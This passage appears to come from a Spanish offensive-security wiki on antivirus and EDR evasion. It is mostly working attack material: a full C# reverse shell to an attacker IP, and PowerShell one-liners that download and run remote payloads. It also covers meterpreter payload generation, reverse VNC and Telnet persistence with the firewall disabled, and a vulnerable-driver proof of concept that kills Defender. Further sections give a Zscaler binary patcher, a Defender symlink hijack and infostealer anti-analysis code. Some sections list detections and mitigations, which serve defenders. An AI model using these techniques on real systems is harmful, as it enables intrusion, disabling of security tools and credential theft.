Consiste en **crear un nuevo proceso sacrificial**, inyectar tu código malicioso de post-exploitation en ese nuevo proceso, ejecutar tu código malicioso y, cuando termine, matar el nuevo proceso. Esto tiene ventajas y desventajas. La ventaja del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso Beacon implant. Esto significa que si algo en nuestra acción de post-exploitation sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implant sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Se trata de inyectar el código malicioso de post-exploitation **en su propio proceso**. De este modo, puedes evitar crear un nuevo proceso y que AV lo analice, pero la desventaja es que si algo sale mal con la ejecución de tu payload, hay una **mucho mayor probabilidad** de **perder tu beacon** ya que podría colapsar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre C# Assembly loading, revisa este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar C# Assemblies **desde PowerShell**, mira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y el [video de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Usando otros lenguajes de programación

Como propone [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso usando otros lenguajes dando a la máquina comprometida acceso **al entorno del intérprete instalado en el recurso compartido SMB controlado por el atacante**.

Al permitir acceso a los Interpreter Binaries y al entorno en el recurso compartido SMB, puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repo indica: Defender aún escanea los scripts, pero al utilizar Go, Java, PHP, etc. tenemos **más flexibilidad para eludir firmas estáticas**. Las pruebas con scripts aleatorios de reverse shell sin ofuscar en estos lenguajes han resultado exitosas.

## TokenStomping

Token stomping es una técnica que permite a un atacante **manipular el access token o un producto de seguridad como un EDR o AV**, permitiéndoles reducir sus privilegios de modo que el proceso no muera pero no tenga permisos para comprobar actividades maliciosas.

Para evitar esto, Windows podría **evitar que procesos externos** obtengan handles sobre los tokens de procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Usando Trusted Software

### Chrome Remote Desktop

Como se describe en [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es fácil desplegar Chrome Remote Desktop en el PC de una víctima y luego usarlo para tomarlo y mantener persistencia:
1. Descarga desde https://remotedesktop.google.com/, haz clic en "Set up via SSH", y luego haz clic en el archivo MSI para Windows para descargarlo.
2. Ejecuta el instalador silenciosamente en la víctima (se requiere admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vuelve a la página de Chrome Remote Desktop y haz clic en siguiente. El asistente te pedirá autorizar; haz clic en el botón Authorize para continuar.
4. Ejecuta el parámetro dado con algunos ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota el parámetro pin que permite establecer el pin sin usar la GUI).


## Evasión avanzada

La evasión es un tema muy complicado; a veces hay que tener en cuenta muchas fuentes diferentes de telemetría en un solo sistema, por lo que es prácticamente imposible permanecer completamente indetectado en entornos maduros.

Cada entorno contra el que te enfrentes tendrá sus propias fortalezas y debilidades.

Te recomiendo ver esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para introducirte en técnicas de Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas antiguas**

### **Comprobar qué partes Defender detecta como maliciosas**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binario** hasta que **descubra qué parte Defender** considera maliciosa y te la muestre.\
Otra herramienta que hace **lo mismo** es [**avred**](https://github.com/dobin/avred) con un servicio web abierto en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hasta Windows10, todas las versiones de Windows venían con un **Telnet server** que podías instalar (como administrador) haciendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que **start** se inicie al arrancar el sistema y ejecuta **run** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Change telnet port** (modo sigiloso) y desactivar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (quieres las descargas bin, no el instalador)

**ON THE HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Habilita la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo **recién** creado _**UltraVNC.ini**_ dentro de la **victim**

#### **Reverse connection**

El **attacker** debe **ejecutar en** su **host** el binario `vncviewer.exe -listen 5900` para que quede **preparado** para recibir una reverse **VNC connection**. Luego, dentro de la **victim**: inicia el daemon `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para mantener el sigilo no debes hacer algunas cosas

- No inicies `winvnc` si ya se está ejecutando o desencadenarás un [popup](https://i.imgur.com/1SROTTl.png). Comprueba si está en ejecución con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o provocará que se abra [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para ayuda o provocarás un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** el **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El Defender actual terminará el proceso muy rápido.**

### Compilando nuestra propia reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primera reverse shell en C#

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usarlo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automáticas:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ejemplo de uso de python para build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 aprovechó una pequeña utilidad de consola conocida como **Antivirus Terminator** para desactivar las protecciones del endpoint antes de desplegar ransomware. La herramienta trae su **propio driver vulnerable pero *firmado*** y lo abusa para emitir operaciones privilegiadas en el kernel que incluso los servicios AV Protected-Process-Light (PPL) no pueden bloquear.

Puntos clave
1. **Signed driver**: El archivo depositado en disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys` de “System In-Depth Analysis Toolkit” de Antiy Labs. Como el driver posee una firma válida de Microsoft se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un **servicio de kernel** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde el espacio de usuario.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capacidad                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario por PID (usado para matar servicios Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario en disco |
| `0x990001D0` | Descargar el driver y eliminar el servicio |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD omite por completo las protecciones en modo usuario; el código que se ejecuta en el kernel puede abrir procesos *protegidos*, terminarlos o manipular objetos del kernel independientemente de PPL/PP, ELAM u otras características de hardening.

Detección / Mitigación
•  Habilitar la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows rechace cargar `AToolsKrnl64.sys`.  
•  Monitorizar la creación de nuevos servicios *kernel* y alertar cuando un driver se cargue desde un directorio escribible por todos o no figure en la lista de permitidos.  
•  Vigilar manejadores en espacio de usuario hacia objetos de dispositivo personalizados seguidos de llamadas sospechosas a `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** aplica reglas de postura de dispositivo localmente y se apoya en Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles hacen posible una evasión completa:

1. La evaluación de postura ocurre **completamente del lado del cliente** (se envía un booleano al servidor).
2. Los endpoints RPC internos solo validan que el ejecutable que se conecta esté **firmado por Zscaler** (vía `WinVerifyTrust`).

Parcheando **cuatro binarios firmados en disco** se pueden neutralizar ambos mecanismos:

| Binary | Lógica original parcheada | Resultado |
|--------|---------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Devuelve siempre `1` por lo que cada comprobación es conforme |
| `ZSAService.exe` | Llamada indirecta a `WinVerifyTrust` | NOP-ed ⇒ cualquier proceso (incluso no firmado) puede enlazarse a las RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Reemplazada por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Comprobaciones de integridad en el túnel | Se han anulado |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar el stack de servicios:

* **Todos** los controles de postura muestran **verde/cumple**.
* Los binarios sin firmar o modificados pueden abrir los endpoints RPC de named-pipe (p. ej. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este estudio de caso demuestra cómo las decisiones de confianza puramente del lado del cliente y las comprobaciones simples de firma pueden ser derrotadas con unos pocos parches de bytes.

## Abusar de Protected Process Light (PPL) para manipular AV/EDR con LOLBINs

Protected Process Light (PPL) aplica una jerarquía de firmante/nivel de protección para que solo los procesos protegidos con igual o mayor nivel puedan manipularse entre sí. Desde una perspectiva ofensiva, si puedes lanzar legítimamente un binario con PPL y controlar sus argumentos, puedes convertir funcionalidad benignas (p. ej., logging) en una primitiva de escritura respaldada por PPL contra directorios protegidos usados por AV/EDR.

Qué hace que un proceso se ejecute como PPL
- El EXE objetivo (y cualquier DLL cargada) debe estar firmado con un EKU compatible con PPL.
- El proceso debe crearse con CreateProcess usando las banderas: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Se debe solicitar un protection level compatible que coincida con el firmante del binario (p. ej., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para firmantes de anti-malware, `PROTECTION_LEVEL_WINDOWS` para firmantes de Windows). Niveles incorrectos fallarán en la creación.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Herramientas de lanzamiento
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Patrón de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie el LOLBIN compatible con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un lanzador (p. ej., CreateProcessAsPPL).
2) Pase el argumento de ruta de registro de ClipUp para forzar la creación de un archivo en un directorio AV protegido (p. ej., Defender Platform). Use nombres 8.3 si es necesario.
3) Si el binario objetivo normalmente está abierto/bloqueado por el AV mientras se ejecuta (p. ej., MsMpEng.exe), programe la escritura en el arranque antes de que el AV se inicie instalando un servicio de autoarranque que se ejecute de forma fiable antes. Valide el orden de arranque con Process Monitor (boot logging).
4) Al reiniciar, la escritura respaldada por PPL ocurre antes de que el AV bloquee sus binarios, corrompiendo el archivo objetivo e impidiendo su inicio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas y restricciones
- No puedes controlar el contenido que ClipUp escribe más allá de la ubicación; la primitiva está diseñada para la corrupción más que para la inyección precisa de contenido.
- Requiere administrador local/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- El tiempo es crítico: el objetivo no debe estar abierto; la ejecución en el arranque evita bloqueos de archivos.

Detecciones
- Creación de procesos de `ClipUp.exe` con argumentos inusuales, especialmente parentados por lanzadores no estándar, alrededor del arranque.
- Nuevos servicios configurados para auto-iniciar binarios sospechosos y que consistentemente inician antes que Defender/AV. Investigar la creación/modificación de servicios previa a fallos en el inicio de Defender.
- Monitoreo de integridad de archivos en los binarios de Defender/directorios Platform; creaciones/modificaciones de archivos inesperadas por procesos con banderas protected-process.
- Telemetría ETW/EDR: buscar procesos creados con `CREATE_PROTECTED_PROCESS` y uso anómalo de niveles PPL por binarios que no son AV.

Mitigaciones
- WDAC/Code Integrity: restringir qué binarios firmados pueden ejecutarse como PPL y bajo qué padres; bloquear la invocación de ClipUp fuera de contextos legítimos.
- Higiene de servicios: restringir la creación/modificación de servicios de auto-arranque y monitorizar la manipulación del orden de inicio.
- Asegurar que la protección contra manipulación de Defender y las protecciones de arranque temprano estén habilitadas; investigar errores de inicio que indiquen corrupción de binarios.
- Considerar deshabilitar la generación de nombres cortos 8.3 en volúmenes que alojan herramientas de seguridad si es compatible con su entorno (probar a fondo).

Referencias para PPL y herramientas
- Microsoft Protected Processes — descripción general: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Referencia EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Registro de arranque de Procmon (validación del orden): https://learn.microsoft.com/sysinternals/downloads/procmon
- Lanzador CreateProcessAsPPL: https://github.com/2x7EQ13/CreateProcessAsPPL
- Análisis de la técnica (ClipUp + PPL + manipulación del orden de arranque): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulación de Microsoft Defender mediante Platform Version Folder Symlink Hijack

Windows Defender elige la plataforma desde la que se ejecuta enumerando subcarpetas bajo:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona la subcarpeta con la cadena de versión lexicográficamente más alta (p. ej., `4.18.25070.5-0`), y luego inicia los procesos de servicio de Defender desde allí (actualizando las rutas del servicio/registro según corresponda). Esta selección confía en las entradas de directorio incluyendo puntos de reanálisis de directorio (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta escribible por el atacante y lograr DLL sideloading o la interrupción del servicio.

Precondiciones
- Administrador local (necesario para crear directorios/symlinks bajo la carpeta Platform)
- Capacidad para reiniciar o forzar la re-selección de la plataforma de Defender (reinicio del servicio en el arranque)
- Solo se requieren herramientas integradas (mklink)

Por qué funciona
- Defender bloquea escrituras en sus propias carpetas, pero su selección de plataforma confía en las entradas de directorio y elige la versión lexicográficamente más alta sin validar que el destino se resuelva a una ruta protegida/confiable.

Paso a paso (ejemplo)
1) Preparar un clon escribible de la carpeta Platform actual, p. ej. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink de directorio de versión superior dentro de Platform que apunte a tu carpeta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección del trigger (se recomienda reiniciar):
```cmd
shutdown /r /t 0
```
4) Verifique que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Deberías observar la nueva ruta del proceso bajo `C:\TMP\AV\` y que la configuración del servicio/registro refleje esa ubicación.

Post-exploitation options
- DLL sideloading/code execution: Colocar/reemplazar DLLs que Defender carga desde su directorio de aplicación para ejecutar código en los procesos de Defender. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Tenga en cuenta que esta técnica no proporciona escalada de privilegios por sí sola; requiere privilegios de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams pueden mover la evasión en tiempo de ejecución fuera del C2 implant y dentro del módulo objetivo mismo hookeando su Import Address Table (IAT) y enrutar APIs seleccionadas a través de código controlado por el atacante y position‑independent (PIC). Esto generaliza la evasión más allá de la pequeña superficie de API que muchos kits exponen (p. ej., CreateProcessA), y extiende las mismas protecciones a BOFs y DLLs post‑explotación.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt Beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Aplica el parche después de relocations/ASLR y antes del primer uso del import. Reflective loaders like TitanLdr/AceLdr demuestran hooking durante DllMain del módulo cargado.
- Mantén los wrappers tiny y PIC-safe; resuelve la API real vía el valor original de la IAT que capturaste antes de parchear o mediante LdrGetProcedureAddress.
- Usa transiciones RW → RX para PIC y evita dejar páginas writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs construyen una cadena de llamadas falsa (direcciones de retorno hacia módulos benignos) y luego pivotan hacia la API real.
- Esto frustra detecciones que esperan stacks canónicos de Beacon/BOFs hacia APIs sensibles.
- Combínalo con técnicas de stack cutting/stack stitching para aterrizar dentro de los marcos esperados antes del prólogo de la API.

Operational integration
- Anteponer el reflective loader a los post‑ex DLLs para que el PIC y los hooks se inicialicen automáticamente cuando se cargue el DLL.
- Usa un script Aggressor para registrar las APIs objetivo de modo que Beacon y BOFs se beneficien de forma transparente del mismo camino de evasión sin cambios de código.

Detection/DFIR considerations
- IAT integrity: entradas que resuelven a direcciones non‑image (heap/anon); verificación periódica de los punteros de import.
- Stack anomalies: return addresses que no pertenecen a imágenes cargadas; transiciones abruptas a PIC non‑image; ascendencia inconsistente de RtlUserThreadStart.
- Loader telemetry: in‑process writes a la IAT, actividad temprana en DllMain que modifica import thunks, regiones RX inesperadas creadas al cargar.
- Image‑load evasion: si se hookea LoadLibrary*, monitoriza cargas sospechosas de automation/clr assemblies correlacionadas con eventos de memory masking.

Related building blocks and examples
- Reflective loaders que realizan IAT patching durante la carga (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) y stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft para evasión fileless y robo de credenciales

SantaStealer (aka BluelineStealer) ilustra cómo los info‑stealers modernos mezclan AV bypass, anti‑analysis y acceso a credenciales en un único flujo de trabajo.

### Keyboard layout gating & sandbox delay

- Un flag de configuración (`anti_cis`) enumera los keyboard layouts instalados vía `GetKeyboardLayoutList`. Si se encuentra un layout cirílico, la muestra coloca un marcador vacío `CIS` y termina antes de ejecutar los stealers, asegurando que nunca detona en locales excluidos mientras deja un hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica en capas `check_antivm` logic

- Variant A recorre la lista de procesos, calcula el hash de cada nombre con un checksum rodante personalizado y lo compara contra blocklists embebidas para debuggers/sandboxes; repite el checksum sobre el nombre del equipo y verifica directorios de trabajo como `C:\analysis`.
- Variant B inspecciona propiedades del sistema (process-count floor, recent uptime), llama a `OpenServiceA("VBoxGuest")` para detectar VirtualBox additions, y realiza timing checks alrededor de sleeps para detectar single-stepping. Cualquier detección aborta antes de que se lancen los módulos.

### Fileless helper + double ChaCha20 reflective loading

